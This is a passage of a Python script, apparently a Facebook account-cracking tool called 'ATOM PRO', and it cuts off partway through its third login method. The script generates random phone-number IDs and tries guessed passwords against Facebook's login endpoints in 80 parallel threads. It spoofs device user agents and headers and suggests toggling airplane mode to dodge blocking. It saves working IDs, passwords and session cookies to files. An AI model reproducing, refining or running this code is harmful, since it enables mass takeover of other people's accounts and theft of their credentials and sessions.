    strvnokiax = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
    strvgt = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
    uateddy = random.choice([strvoppo, strvredmi,strvoppo1, strvinfinix, strvsamsung, strvredmi1, strvnokiax, strvgt])
    return uateddy
faltu = "\033[1;47m";pvt = "\033[1;0m";black="\033[1;30m"  
class System:
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.cps = []
        self.gen = []
    
    def banner(self):
        os.system("clear")
        print(f"""
{faltu} {black}"If you get tired, learn to rest, not to quit".... {pvt}
\033[1;32m
    █████╗ ████████╗ ██████╗ ███╗   ███╗
   ██╔══██╗╚══██╔══╝██╔═══██╗████╗ ████║
   ███████║   ██║   ██║   ██║██╔████╔██║
   ██╔══██║   ██║   ██║   ██║██║╚██╔╝██║
   ██║  ██║   ██║   ╚██████╔╝██║ ╚═╝ ██║
   ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝ \033[1;34m ᴾᴿᴼ
\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
        print("Author    : SUMON ROY ")
        print("ABOUTS    :  a script designed to attempt logins")
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    def Main(self):
        self.banner()
        code1 = input("INPUT CODE : ")
        code2 = input("INPUT CODE : ")
        limit = int(input("INPUT TOTAL LIMIT : "))
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n[1] METHOD 1\n[2] METHOD 2\n[3] METHOD 3")
        method_select = input("SELECT METHOD : ")
        for a in range(limit):
            xxx = "".join(random.choice(string.digits) for _ in range(6))
            self.gen.append(xxx)
        with tred(max_workers=80) as randx:
            self.banner()
            print(' USE FLIGHT (\033[1;32mAIRPLANE\033[1;32m) MODE ON/OFF ')
            print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            for love in self.gen:
                ids = random.choice([code1,code2])+love
                passlist = [ids[:6],ids,ids[:7],love[:6] ,"57273200"]
                if method_select == "1":randx.submit(self.method1,ids,passlist)
                elif method_select == "2":randx.submit(self.method2,ids,passlist)
                elif method_select == "3":randx.submit(self.method3,ids,passlist)
                else:randx.submit(self.method3,ids,passlist)
        print("\n")
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    def samsung_user_agent(self):
        fbav = str(random.randint(111,111))+'.'+str(random.randint(111,999))+'.'+str(random.randint(111,999))+'.'+str(random.randint(111,999))
        fbbv = str(random.randint(111111111,999999999))
        fblc = random.choice(["en_US","en_GB","en_IN","bn_IN","hi_IN","np_NP","en_NP","id_ID"])
        fbcrr = random.choice(["MTN","AWCC","Roshan","Zong","Jazz","Etisalat","null","",""])
        fbcr = random.choice(["Jio","Airtel","Vodafone","BSNL","Vi","jio","null","nCell","Nepal Telecom"])
        abc = random.choice(["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"])
        model = f"{abc}{str(random.randint(111,999))}{abc}"
        samsung_model = random.choice(["Samsung Galaxy S21 Ultra", "Samsung Galaxy Note 20 Ultra", "Samsung Galaxy S20 FE", "Samsung Galaxy A52", "Samsung Galaxy A32", "Samsung Galaxy S10+", "Samsung Galaxy Note 10", "Samsung Galaxy A71", "Samsung Galaxy A12", "Samsung Galaxy M31", "Samsung Galaxy S9", "Samsung Galaxy A42", "Samsung Galaxy A22", "Samsung Galaxy A02", "Samsung Galaxy Z Fold 2", "Samsung Galaxy A51", "Samsung Galaxy A31", "Samsung Galaxy M21", "Samsung Galaxy S8", "Samsung Galaxy A72", "Samsung Galaxy A52 5G", "Samsung Galaxy A21s", "Samsung Galaxy M51", "Samsung Galaxy S7", "Samsung Galaxy Note 9"])
        android_version = str(random.randrange(6,13))
        ua___ = f"[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM/{{density=3.0,width=1080,height=2076}};FBLC/{fblc};FBRV/0;FBCR/{fbcr};FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{samsung_model};FBSV/{android_version};FBOP/1;FBCA/arm64-v8a:;]"
        return ua___
    
    def method1(self,ids,passlist):
        global loop,oks,cps
        ses = requests.Session()
        google_pixel = ["BRAVIA 2015","BRAVIA 2K GB ATV3","BRAVIA 4K 2015","BRAVIA 4K GB","BRAVIA 4K GB ATV3","BRAVIA 4K UR2","BRAVIA 4K UR3","BRAVIA 4K VH2","BRAVIA VH1","BRAVIA VU1","Sony Experia 10","H4433","SONY-M880","SGP412","SGP551","SmartWatch 3","Sony Tablet P","Sony Tablet P","Sony Tablet P","Sony Tablet P","Sony Tablet S","Sony Tablet S","Sony Tablet S","Sony Tablet S","Sony Tablet S","NW-A100Series","NW-Z1000Series","Sony Xperia","J9110","802SO","SOV40","SO-51A","SOG01","XQ-AT51","XQ-AT42","SO51Aa","SO-51B","XQ-BC52","SOG03","XQ-BC72","XQ-CT72","XQ-CT54","SOG06","I4113","I3113","I4193","SO-41A","SOV43","A001SO","XQ-AU52","XQ-AT52","XQ-BT52","SOG04","A102SO","SO-52B","XQ-BT44","XQ-CC54","XQ-CC72","SO-52C","A202SO","I4293","I4213","SOV41","901SO","SO-01M","J8210","J9210","SO-52A","SOG02","XQ-AS52","A002SO","XQ-AS72","XQ-BQ52","SO-53B","SOG05","XQ-BQ72","A103SO","XQ-CQ54","XQ-CQ72","SOV42","902SO","J3273","SO-04E","SonySO-04E","Xperia A","SO-04F","SAMSUNG Xperia a369i","SO-04G","SO-04G","J3173","SO-41B","SOG08","SO-53C","A203SO","Xperia Active","Xperia Active","Xperia Active","Xperia Arc","Xperia Arc","Xperia Arc","Xperia Arc S","Xperia Arc S","Xperia Arc S","Xperia Arc S","Xperia Arc S","Xperia Arc S","Xperia Arc S","Xperia Arc S","Xperia Arc S","Xperia Arc S","Xperia Arc S","Xperia Arc S","Xperia Arc S","SonyEricssonSO-02C","SonyEricssonSO-02C","SonyEricssonSO-02C","SonyEricssonSO-02C","SonyEricssonSO-02C","SonyEricssonSO-02C","SonyEricssonSO-02C","SonyEricssonSO-03D","SonyEricssonSO-03D","SonyEricssonSO-03D","SonyEricssonSO-03D","SonyEricssonSO-03D","SonyEricssonSO-03D","SonyEricssonSO-03D","LT26w","LT26w","SO-01E","Sony Xperia B6376","XPERIA BEAST 3","Xperia Burst","S39h","C2304","C2305","C2304","C2305","D2533","D2502","E5306","E5303","E5303","E5353","E5333","E5363","E5333","Xperia C5","E5553","E5506","E5533","E5563","XPERIA CUSTOM XA8","C1505","C1505","C1504","SonyC1504","SonyC1505v","SonyC1505","SonyC1504","SonyC1505","SonyC1504","C1505","C1505","SonyC1505","SonyC1505","SonyC1505","C1604","SonyC1605","SonyC1604","C1605","C1605","SonyC1605","C1604","SonyC1605","D2005","D2004","SonyD2005","D2005","D2104","D2114","D2105","D2105","XPERIA E16i","D2203","D2202","D2243","D2206","Xperia E3 3G","E3 Dual","D2212","D2212","D2212","E2115","E2104","E2105","xperia e4 dual","E2003","E2053","E2006","E2043","E2033","E2033","F3311","F3313","Xperia F_v3 Ultra","SONY XPERIA G","SonyST27a","SonyST27i","ST27a","ST27i","ST27I","ru ST27i","SonyST27i","SonyEricssonST27i","ST27i","ST27i","SO-04D","SonySO-04D","Xperia H870","SonyLT28i","SonyLT28h","LT28h","SonyEricssonLT28at","SonyEricssonLT28h","LT28i","LT28h","SonyLT28h","Xperia ion","Xperia ion","SonyEricssonLT28i","SonyEricssonLT28i","SonyEricssonLT28h","SonyEricssonLT28i","SonyST26a","ST26a","SonyST26i-o","SonyST26i","ST26i","ST26i","Xperia J","SonyST26i","SonyST26i","SonyST26i","SonyST26i","SonyST26i","ST26i","C2105","C2105","C2105","C2105","C2105","G3311","G3311","G3313","G3312","ru G3312","H3311","H3321","H4311","I3312","I4312","XQ-AD52","C1905","C1904","C1905","SonyC1904","SonyC1905","C1905","C1905","C2004","C2005","D2303","D2306","D2303","Xperia M2 3G","D2406","D2403","D2302","XPERIA M2 HSPASS","E2303","E2333","E2306","E2363","E2312","E2312","E5603","E5606","E5653","E5633","E5663","Xperia Mini","Xperia Mini","Xperia Mini","Xperia Mini","Xperia Mini","Xperia Mini Pro","Xperia Mini Pro","Xperia Mini Pro","Xperia Mini Pro","Xperia Mini Pro","Xperia mini pro","ST23i","SonyST23iv","SonyST23a","ST23i","SonyST23i","ST23i","ST23i","ST23i","SonyST23i","SonyST23i","SonyST23i","Xperia Neo","Xperia Neo","Xperia Neo","Xperia Neo","Xperia Neo","Xperia Neo L","Xperia Neo V","Xperia Neo V","Sony Xperia Neo V","Xperia Neo V","Xperia Neo V","Xperia Neo V","Xperia Neo V","Xperia Neo V","Xperia Neo V","Xperia Neo V","SO-02D","Xperia P","SonyLT22i","LT22i","SonyEricssonLT22i","SonyEricssonLT22i-o","LT22i","LT22i","LT22i","SonyEricssonLT22i-o","SonyLT22i","XQ-AQ52","XQ-AQ62","XQ-BE52","XQ-BE62","XQ-BE72","G2299","Xperia Ray","Xperia Ray","Xperia Ray","Xperia Ray","Xperia Ray","Xperia Ray","Xperia Ray","Xperia Ray","Xperia Ray","Xperia Ray","Sony Xperia RC","Sony Xperia RC","SonyLT26iv","LT26i","SonyEricssonLT26i-o","SonyEricssonLT26i","LT26i","Xperia S","LT26i","SonyEricssonLT26i","Xperia S","Xperia S","Xperia S","SonyLT26i","LT26ii","ru LT26ii","LT26ii","LT26ii","Xperia Sola","Xperia Sola","C5303","C5302","C5306","SonyC5303","SonyC5306","C5303","Xperia SP","SO-05D","LT30p","SonyLT30p-o","LT30p","SonyLT30p","LT30p","LT30a","SonyLT30a","D5303","D5306","D5316","XM50h","XM50t","D5303","D5322","Xperia T3","D5103","D5102","D5106","D5103","Xperia Tab","SGPT12","Xperia Tablet S","SGPT13","SGPT13","SGPT12","SGP311","SGP321","SGP312","SGP512","SGP511","SGP521","SGP621","SGP611","SGP712","SonyST21i","SonyST21i","SonyST21i-o","ST21i","ST21a","ST21i","SonyST21a","SonyST21i","SonyST21i","SonyST21i","SonyST21i","SonyST21i","SonyST21i","SonyST21a","SonyST21i","SonyST21a","ST21i2","SonyST21a2","SonyST21i2","SonyST21i2","SonyST21i2","ru ST21i2","SonyST21i2","ST21i2","LT29i","Xperia TX","SonyST25i","ST25a","ST25i","ST25a","SonyEricssonST25i","ST25i","ru ST25i","ST25i","SonyEricssonST25i","SonyEricssonST25i","SonyEricssonST25i","SOL22","SOL22","SonySOL22","Xperia UL","Xperia V","SonyLT25i","Sony Xperia V","SonyLT25i","SonySOL21","F5121","F5321","SO-02J","F5122","502SO","F8131","SO-04H","SOV33","F8132","Xperia X10","Xperia X10","Xperia X10","Xperia X10","Xperia x10 Mini Pro","Xperia X42","Xperia X8","XPERIA X8","Xperia X8","XPERIA X8","XPERIA X8","Xperia X8","Xperia X8","Xperia X8","XPERIA X8","F3111","F3115","Xperia XA 4"]
        sys.stdout.write(f"\r\r\033[1;32m M-1|{self.loop}|OK:-{len(self.oks)}|CP:-{len(self.cps)}\r\r"),
        sys.stdout.flush()
        try:
            for pas in passlist:
                url = "https://touch.facebook.com/"
                curl = ses.get(url)
                data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(curl.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(curl.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(curl.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(curl.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
                headers = {
                'authority': 'mbasic.facebook.com',
                'method': 'POST',
                'path': '/login/device-based/login/async/',
                'scheme': 'https',
                'accept': '*/*',
                'accept-language': 'en-US,en-IN;q=0.9,en;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://mbasic.facebook.com',
                'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=779900868722692&kid_directed_site=0&app_id=779900868722692&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fclient_id%3D779900868722692%26redirect_uri%3Dhttps%253A%252F%252Funsplash.com%252Fnlog%252Ffacebook%26response_type%3Dcode%26scope%3Demail%2Bpublic_profile%26state%3DeyJyZWZlcnJlciI6Ii9zL3Bob3Rvcy9waG90byIsInJlZmVycmVyX2xvY2FsZSI6ImVuLVVTIiwiY3NyZl90b2tlbiI6IkVqMnhVNDVsU05WaW5tNTUtQmJWNmU5NjYyS3NSVzlsUjlrOWpJczQ1TU1EWTJabnBvN1BLNTlyUFZOVSJ9%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd7d150ac-7c93-4a51-8f6b-42aa40ac651f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Funsplash.com%2Fnlog%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJyZWZlcnJlciI6Ii9zL3Bob3Rvcy9waG90byIsInJlZmVycmVyX2xvY2FsZSI6ImVuLVVTIiwiY3NyZl90b2tlbiI6IkVqMnhVNDVsU05WaW5tNTUtQmJWNmU5NjYyS3NSVzlsUjlrOWpJczQ1TU1EWTJabnBvN1BLNTlyUFZOVSJ9%23_%3D_&display=touch&locale=bn_IN&pl_dbl=0&refsrc=deprecated&_rdr',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
                'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6961.0"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-model': str(random.choice(google_pixel)),
                'sec-ch-ua-platform': '"Linux"',
                'sec-ch-ua-platform-version': ''+str(random.randint(7,10))+'.0.0',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': self.samsung_user_agent(),
                'x-asbd-id': '359341',
                'x-fb-lsd': '',
                'x-requested-with': 'XMLHttpRequest',
                'x-response-format': 'JSONStream',}
                login_url = "https://mbasic.facebook.com/login/device-based/login/async/?api_key=779900868722692&auth_token=af06de30d9acd77f7bbc31679fd0f694&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fclient_id%3D779900868722692%26redirect_uri%3Dhttps%253A%252F%252Funsplash.com%252Fnlog%252Ffacebook%26response_type%3Dcode%26scope%3Demail%2Bpublic_profile%26state%3DeyJyZWZlcnJlciI6Ii9zL3Bob3Rvcy9waG90byIsInJlZmVycmVyX2xvY2FsZSI6ImVuLVVTIiwiY3NyZl90b2tlbiI6IkVqMnhVNDVsU05WaW5tNTUtQmJWNmU5NjYyS3NSVzlsUjlrOWpJczQ1TU1EWTJabnBvN1BLNTlyUFZOVSJ9%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd7d150ac-7c93-4a51-8f6b-42aa40ac651f%26tp%3Dunspecified&refsrc=deprecated&app_id=779900868722692&cancel=https%3A%2F%2Funsplash.com%2Fnlog%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJyZWZlcnJlciI6Ii9zL3Bob3Rvcy9waG90byIsInJlZmVycmVyX2xvY2FsZSI6ImVuLVVTIiwiY3NyZl90b2tlbiI6IkVqMnhVNDVsU05WaW5tNTUtQmJWNmU5NjYyS3NSVzlsUjlrOWpJczQ1TU1EWTJabnBvN1BLNTlyUFZOVSJ9%23_%3D_&lwv=100"
                response = ses.post(url=login_url, data=data, headers=headers)
                log_cookies = ses.cookies.get_dict().keys()
                if "c_user" in log_cookies:
                    kuki=";".join([f"{key}={ses.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                    user = re.findall('c_user=(.*);xs', kuki)[0]
                    req = requests.get(f"https://graph.facebook.com/{user}/picture?type=normal").text
                    if "Photoshop" in req:
                        print(f"\r\r\x1b[38;5;46mATOM-OK • {user} • {pas} • {kuki}")
                        open("/sdcard/ATOM-OK.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
                        self.oks.append(user)
                        break
                elif "checkpoint" in log_cookies:
                    open("/sdcard/ATOM-CP.txt","a").write(user+"|"+pas+"\n")
                    self.cps.append(user)
                    break
                else:continue
            self.loop += 1
        except cerror:time.sleep(10)
        except Exception as e:pass
    
    def method2(self,ids,passlist):
        global loop,oks,cps
        ses = requests.Session()
        sys.stdout.write(f"\r\r\033[1;32m M-2|{self.loop}|OK:-{len(self.oks)}|CP:-{len(self.cps)}\r\r"),
        sys.stdout.flush()
        try:
            for pas in passlist:
                url = "https://touch.facebook.com/"
                curl = ses.get(url)
                data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(curl.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(curl.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(curl.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(curl.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
                headers = {
                'authority': 'www.facebook.com',
                'method': 'POST', 
                'path': '/login/device-based/regular/login/?login_attempt=1', 
                'scheme': 'https',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 
                'accept-language': 'en-US,en-IN;q=0.9,en;q=0.8', 
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'dpr': '3',
                'origin': 'https://www.facebook.com',
                'referer': 'https://www.facebook.com/login.php?skip_api_login=1&api_key=1718380515655421&kid_directed_site=0&app_id=1718380515655421&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fv9.0%2Fdialog%2Foauth%3Fapp_id%3D1718380515655421%26cbt%3D1747636611478%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df9be1a2af0386262b%2526domain%253Dwww.joytify.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joytify.com%25252Ff2236f8decdda0d2e%2526relation%253Dopener%26client_id%3D1718380515655421%26display%3Dpopup%26domain%3Dwww.joytify.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.joytify.com%252Fen-us%252Fmobile-legends%26locale%3Den_US%26logger_id%3Df07d7c4f0f56598ba%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfa3f64cb62f26007f%2526domain%253Dwww.joytify.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joytify.com%25252Ff2236f8decdda0d2e%2526relation%253Dopener%2526frame%253Dfb83b5c58426b5953%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252C%2Bemail%26sdk%3Djoey%26version%3Dv9.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfa3f64cb62f26007f%26domain%3Dwww.joytify.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.joytify.com%252Ff2236f8decdda0d2e%26relation%3Dopener%26frame%3Dfb83b5c58426b5953%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=popup&locale=en_GB&pl_dbl=0', 
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""', 
                'sec-ch-ua-platform': '"Linux"',
                'sec-ch-ua-platform-version': '""',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': self.samsung_user_agent(),
                'viewport-width': '980'}
                login_url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fv9.0%2Fdialog%2Foauth%3Fapp_id%3D1718380515655421%26cbt%3D1747636611478%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df9be1a2af0386262b%2526domain%253Dwww.joytify.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joytify.com%25252Ff2236f8decdda0d2e%2526relation%253Dopener%26client_id%3D1718380515655421%26display%3Dpopup%26domain%3Dwww.joytify.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.joytify.com%252Fen-us%252Fmobile-legends%26locale%3Den_US%26logger_id%3Df07d7c4f0f56598ba%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfa3f64cb62f26007f%2526domain%253Dwww.joytify.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joytify.com%25252Ff2236f8decdda0d2e%2526relation%253Dopener%2526frame%253Dfb83b5c58426b5953%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252C%2Bemail%26sdk%3Djoey%26version%3Dv9.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&popup=1&lwv=100"
                response = ses.post(url=login_url, data=data, headers=headers)
                log_cookies = ses.cookies.get_dict().keys()
                if "c_user" in log_cookies:
                    kuki=";".join([f"{key}={ses.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                    user = re.findall('c_user=(.*);xs', kuki)[0]
                    req = requests.get(f"https://graph.facebook.com/{user}/picture?type=normal").text
                    if "Photoshop" in req:
                        print(f"\r\r\x1b[38;5;46mATOM-OK • {user} • {pas} • {kuki}")
                        open("/sdcard/ATOM-OK.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
                        self.oks.append(user)
                        break
                elif "checkpoint" in log_cookies:
                    open("/sdcard/ATOM-CP.txt","a").write(user+"|"+pas+"\n")
                    self.cps.append(user)
                    break
                else:continue
            self.loop += 1
        except cerror:time.sleep(10)
        except Exception as e:print(error)
    
    def method3(self,ids,passlist):
        global loop,oks,cps
        ses = requests.Session()
        sys.stdout.write(f"\r\r\033[1;32m M-3|{self.loop}|OK:-{len(self.oks)}|CP:-{len(self.cps)}\r\r"),
        sys.stdout.flush()
        try:
            for pas in passlist:
                data = {
    'method': 'post',
    'pretty': 'false',
    'format': 'json',
    'server_timestamps': 'true',
    'locale': '-',
    'purpose': 'fetch',
    'fb_api_req_friendly_name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request',
    'fb_api_caller_class': 'graphservice',
    'client_doc_id': '11994080424240083948543644217',
    'variables': json.dumps({
        "params": {
            "params": json.dumps({
                "client_input_params": json.dumps({
                    "sim_phones": [],
                    "secure_family_device_id": str(uuid.uuid4()),
                    "auth_secure_device_id": "",
                    "has_whatsapp_installed": 1,
                    "password": "#PWD_FB4A:0:{}:{}".format(int(time.time()), pas),
                    "sso_token_map_json_string": "",
                    "event_flow": "login_manual",
                    "sim_serials": [],
                    "client_known_key_hash": "",
                    "encrypted_msisdn": "",
                    "should_show_nested_nta_from_aymh": 0,
                    "device_id": str(uuid.uuid4()),
                    "login_attempt_count": 1,
                    "machine_id": "btqmzg6mx6h3dr2bnwn82yvj",
                    "flash_call_permission_status": json.dumps({
                        "READ_PHONE_STATE": "DENIED",
                        "READ_CALL_LOG": "DENIED",
                        "ANSWER_PHONE_CALLS": "DENIED"
                    }),
                    "accounts_list": [],
                    "family_device_id": str(uuid.uuid4()),
                    "fb_ig_device_id": [],
                    "device_emails": [],
                    "try_num": 3,
                    "lois_settings": json.dumps({
                        "lois_token": "",
                        "lara_override": ""
                    }),
                    "event_step": "home_page",
                    "headers_infra_flow_id": "",
                    "openid_tokens": {},
                    "contact_point": ids
                }),
                "server_params": json.dumps({
                    "should_trigger_override_login_2fa_action": 0,
                    "is_from_logged_out": 0,
                    "should_trigger_override_login_success_action": 0,
                    "login_credential_type": "none",
                    "server_login_source": "login",
                    "waterfall_id": str(uuid.uuid4()),
                    "login_source": "Login",
                    "is_platform_login": 0,
                    "pw_encryption_try_count": 1,
                    "INTERNALlatency_qpl_marker_id": 36707139,
                    "offline_experiment_group": "caa_iteration_v6_perf_fb_2",
                    "is_from_landing_page": 0,
                    "password_text_input_id": "5tm5yt:28",
                    "is_from_empty_password": 0,
                    "ar_event_source": "login_home_page",
                    "username_text_input_id": "zfiojk:27",
                    "layered_homepage_experiment_group": "",
                    "device_id": str(uuid.uuid4()),
                    "INTERNALlatency_qpl_instance_id": "0.7186605966306517",
                    "reg_flow_source": "login_home_native_integration_point",
                    "is_caa_perf_enabled": 1,
                    "credential_type": "password",
                    "is_from_password_entry_page": 0,
                    "caller": "gslr",
                    "family_device_id": str(uuid.uuid4()),
                    "INTERNAL_INFRA_THEME": "harm_f,default,harm_f",
                    "is_from_assistive_id": 0,
                    "access_flow_version": "F2_FLOW",
                    "is_from_logged_in_switcher": 0
                })
            }),
            "bloks_versioning_id": "c459b951c037ad3fbe67f94342f309a73154e66c326b3cd823682078d9eeb722",
            "app_id": "com.bloks.www.bloks.caa.login.async.send_login_request"
        },
        "scale": "47",
        "nt_context": json.dumps({
            "using_white_navbar": "True",
            "pixel_ratio": 3,
            "is_push_on": "False",
            "styles_id": "196702b4d5dfb9dbf1ded6d58ee42767",
            "bloks_version": "c459b951c037ad3fbe67f94342f309a73154e66c326b3cd823682078d9eeb722"
        })
    }),
    'fb_api_analytics_tags': '["GraphServices"]',
    'client_trace_id': str(uuid.uuid4())
}
                headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'b-graph.facebook.com',
                'User-Agent': create_ua(),
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'cell.CTRadioAccessTechnologyLTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'Accept-Encoding': 'gzip, deflate',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                'Connection': 'Keep-Alive'}
